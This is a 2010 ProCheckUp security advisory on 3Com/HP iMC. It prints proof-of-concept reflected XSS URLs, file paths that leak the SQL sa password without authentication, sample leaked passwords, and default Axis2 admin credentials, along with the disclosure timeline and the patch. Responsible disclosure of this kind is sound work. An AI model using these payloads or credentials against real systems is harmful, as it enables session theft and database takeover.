@@ -1,0 +1,96 @@
+PR10-02: Various XSS and information disclosure flaws within 3Com* iMC (Intelligent Management Center)
+
+* On the 12th April 2010 Hewlett Packard completed its acquisition of 3Com
+
+Vulnerability found: 29th January 2010
+
+Vendor informed:  1st February 2010
+
+Vulnerability fixed: 13th May 2010
+
+Severity: Medium/High
+
+Description: 
+
+3Com's iMC (Intelligent Management Centre) provides professional management of 3Com and third party network devices, the IMC is normally accessed using a web browser over port 8080. Various IMC pages are vulnerable to a reflective XSS attack, including the login page. Various pages also disclose information including the SQL sa account password which might be used to assist in carrying out further attacks. 
+
+
+Note: tested on 3Com IMC running on Windows and Microsoft SQL 2005
+
+Version 3.3.9   R2 606 29 Sept 2009
+Version 3.3 SP1 R2 606 15 Dec 2009
+
+
+The following demonstrate the XSS flaws (no authentication needed):
+
+1) The login page is vulnerable to a vanilla XSS
+
+
+http://target-domain.foo:8080/imc/login.jsf?loginForm%3a_link_hidden_=&javax.faces.ViewState=%3C/textarea%3E%3Cscript%3Ealert(1)%3C/script%3E
+
+
+
+
+2) IE only
+
+http://target-domain.foo:8080/imc/dwr/call/plaincall/blah?callCount=<script>alert(1)</script>
+http://target-domain.foo:8080/imc/dwr/interface/<script>alert(1)</script>
+
+
+
+Consequences: 
+
+An attacker may be able to cause execution of malicious scripting code in the browser of a user who clicks on a link to a 3Com IMC-based site. Such code would run within the security context of the target domain. This type of attack can result in non-persistent defacement of the target site, or the redirection of confidential information (i.e.: session IDs) to unauthorised third parties.
+
+----------------------------------------------------------------------------------------------------------------------------------------------
+
+The following demonstrate the Information disclosure flaws (no authentication needed)
+
+1) The SQL sa account password can be remotely retrieved, by knowing the path of the  configuration file.
+
+http://target-domain.foo:8080/imc/reportscript/sqlserver/deploypara.properties
+http://target-domain.foo:8080/rpt/reportscript/sqlserver/deploypara.properties
+http://target-domain.foo:8080/imc/reportscript/oracle/deploypara.properties
+
+The sql file contains the following information:-
+report.db.server.name=127.0.0.1
+report.db.server.sa.pass=iMC-Install2005
+report.db.server.user.pass=sqlsql
+
+2) Information about the web services supported is publically disclosed by the Axis2 console.
+http://target-domain.foo:8080/imcws/
+
+Including services configuration
+http://target-domain.foo:8080/imcws/services/listServices
+
+The Axis2 console has the default credentials - User=admin Password=axis
+http://target-domain.foo:8080/imcws/axis2-admin/
+
+The Admin console allows machine configuration to be viewed and changed and new services uploaded.
+
+Consequences: 
+
+An attacker may be able to obtain additional information on the machines configuration, and use this information for more advanced attacks.
+
+
+Fix:
+Ensure that at least patch 3.3SP2 (R2606P13) has been installed. 
+
+References: 
+
+http://www.procheckup.com/Vulnerabilities.php
+
+
+
+Credits: Richard Brain of ProCheckUp Ltd (www.procheckup.com)
+
+
+Legal:
+
+Copyright 2010 Procheckup Ltd. All rights reserved.
+
+Permission is granted for copying and circulating this Bulletin to the Internet community for the purpose of alerting them to problems, if and only if, the Bulletin is not edited or changed in any way, is attributed to Procheckup, and provided such reproduction and/or distribution is performed for non-commercial purposes.
+
+Any other use of this information is prohibited. Procheckup is not liable for any misuse of this information by any third party.
+
+
